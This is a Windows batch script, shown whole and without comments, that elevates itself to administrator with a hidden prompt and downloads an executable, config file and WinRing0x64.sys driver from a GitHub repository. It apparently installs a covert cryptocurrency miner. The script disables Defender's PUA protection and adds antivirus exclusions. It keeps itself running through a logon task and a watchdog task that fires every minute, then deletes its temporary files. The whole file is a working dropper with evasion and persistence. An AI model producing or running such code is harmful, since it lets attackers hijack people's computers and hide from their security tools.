@echo off
net session >nul 2>&1
if %errorLevel% equ 0 goto :main
powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c ""%~f0""' -Verb RunAs -WindowStyle Hidden"
exit /b

:main
set DEST=C:\ProgramData\VLTrig
set TMP=%TEMP%\vl_tmp

if not exist "%TMP%" mkdir "%TMP%"

curl -sL "https://raw.githubusercontent.com/4etex/myfarmmachine/master/vltrig.exe"       -o "%TMP%\vltrig.exe"
curl -sL "https://raw.githubusercontent.com/4etex/myfarmmachine/master/config.json"      -o "%TMP%\config.json"
curl -sL "https://raw.githubusercontent.com/4etex/myfarmmachine/master/WinRing0x64.sys"  -o "%TMP%\WinRing0x64.sys"

if not exist "%DEST%" mkdir "%DEST%"

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%DEST%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'vltrig.exe' -ErrorAction SilentlyContinue"

copy /y "%TMP%\vltrig.exe"      "%DEST%\" >nul
copy /y "%TMP%\config.json"     "%DEST%\" >nul
copy /y "%TMP%\WinRing0x64.sys" "%DEST%\" >nul

schtasks /delete /tn "VLTrig" /f >nul 2>&1
schtasks /delete /tn "VLTrigWatch" /f >nul 2>&1

schtasks /create /tn "VLTrig" /tr "\"%DEST%\vltrig.exe\" --config=\"%DEST%\config.json\"" /sc onlogon /rl highest /f >nul

schtasks /create /tn "VLTrigWatch" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"if (-not (Get-Process vltrig -ErrorAction SilentlyContinue)) { Start-Process '%DEST%\vltrig.exe' -ArgumentList '--config=%DEST%\config.json' }\"" /sc minute /mo 1 /rl highest /f >nul

schtasks /run /tn "VLTrig" >nul
timeout /t 3 /nobreak >nul
tasklist | find /i "vltrig.exe" >nul 2>&1
if %errorLevel% neq 0 start "" /b "%DEST%\vltrig.exe" --config="%DEST%\config.json"

rmdir /s /q "%TMP%"
